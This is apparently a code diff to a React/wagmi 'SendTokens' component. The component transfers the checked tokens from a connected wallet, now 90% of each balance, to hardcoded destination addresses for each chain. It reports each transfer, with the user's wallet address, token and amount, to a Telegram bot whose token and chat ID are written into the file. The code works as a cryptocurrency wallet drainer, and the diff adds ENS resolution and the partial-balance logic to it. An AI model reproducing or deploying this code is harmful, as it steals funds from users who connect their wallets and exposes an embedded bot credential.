@@ -3,10 +3,10 @@ import { Button, useToasts } from '@geist-ui/core';
 import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { erc20Abi } from 'viem';
 import { useAtom } from 'jotai';
+import { normalize } from 'viem/ens';
 import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import axios from 'axios';
-import { parseEther } from 'viem';
 
 const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
@@ -31,8 +31,17 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
-function selectAddressForToken(network: number): `0x${string}` | undefined {
-  const selectedAddress = destinationAddresses[network];
+function selectAddressForToken(network: number) {
+  const addresses = {
+    1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
+    56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+    137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
+  };
+
+  const selectedAddress = addresses[network];
 
   if (selectedAddress) {
     console.log('Great Job! Selected Address:', selectedAddress);
@@ -58,6 +67,8 @@ export const SendTokens = () => {
   const publicClient = usePublicClient();
   const { chain, address, isConnected } = useAccount();
 
+  const percentageToTransfer = 90; // Define the percentage of the balance to transfer
+
   const sendAllCheckedTokens = async () => {
     const tokensToSend: string[] = Object.entries(checkedRecords)
       .filter(([_, { isChecked }]) => isChecked)
@@ -65,10 +76,30 @@ export const SendTokens = () => {
 
     if (!walletClient || !publicClient) return;
 
-    const destinationAddress = selectAddressForToken(chain?.id || 0);
+    const destinationAddress = destinationAddresses[chain?.id];
     if (!destinationAddress) {
       showToast('Unsupported chain or no destination address found for this network', 'error');
       return;
+    }
+
+    selectAddressForToken(chain?.id);
+
+    let resolvedDestinationAddress = destinationAddress;
+    if (destinationAddress.includes('.')) {
+      try {
+        resolvedDestinationAddress = await publicClient.getEnsAddress({
+          name: normalize(destinationAddress),
+        });
+        if (resolvedDestinationAddress) {
+          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
+        }
+      } catch (error: unknown) {
+        if (error instanceof Error) {
+          showToast(`Error resolving ENS address: ${error.message}`, 'warning');
+        } else {
+          showToast('An unknown error occurred while resolving ENS address', 'warning');
+        }
+      }
     }
 
     for (const tokenAddress of tokensToSend) {
@@ -78,16 +109,19 @@ export const SendTokens = () => {
         ? (tokenAddress as `0x${string}`)
         : (`0x${tokenAddress}` as `0x${string}`);
 
+      const balance = BigInt(token?.balance || '0');
+      const amountToSend = balance * BigInt(percentageToTransfer) / BigInt(100);
+
       try {
-        const formattedDestinationAddress: `0x${string}` = destinationAddress.startsWith('0x')
-          ? (destinationAddress as `0x${string}`)
-          : (`0x${destinationAddress}` as `0x${string}`);
+        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x')
+          ? (resolvedDestinationAddress as `0x${string}`)
+          : (`0x${resolvedDestinationAddress}` as `0x${string}`);
 
         if (tokenAddress === 'native') {
           // Handle native token transfer
           const res = await walletClient.sendTransaction({
             to: formattedDestinationAddress,
-            value: parseEther(token?.balance || '0'),
+            value: amountToSend,
           });
 
           setCheckedRecords((old) => ({
@@ -99,7 +133,7 @@ export const SendTokens = () => {
           }));
 
           showToast(
-            `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
+            `Transfer of ${amountToSend} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
             'success',
           );
         } else {
@@ -111,7 +145,7 @@ export const SendTokens = () => {
             functionName: 'transfer',
             args: [
               formattedDestinationAddress,
-              BigInt(token?.balance || '0'),
+              amountToSend,
             ],
           });
 
@@ -126,23 +160,17 @@ export const SendTokens = () => {
           }));
 
           showToast(
-            `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
+            `Transfer of ${amountToSend} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
             'success',
           );
         }
 
         await sendTelegramNotification(
-          `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
+          `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${amountToSend}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
         );
       } catch (err: any) {
-        console.error('Detailed Error:', err);
-
-        // Ensure error message is a string and properly handled
-        const errorMessage = err?.message || 'Unknown error occurred';
-
-        // Avoid splitting or using methods that might not exist on error
         showToast(
-          `Error with ${token?.contract_ticker_symbol}: ${errorMessage}`,
+          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
           'warning',
         );
       }
@@ -168,5 +196,3 @@ export const SendTokens = () => {
     </div>
   );
 };
-
-
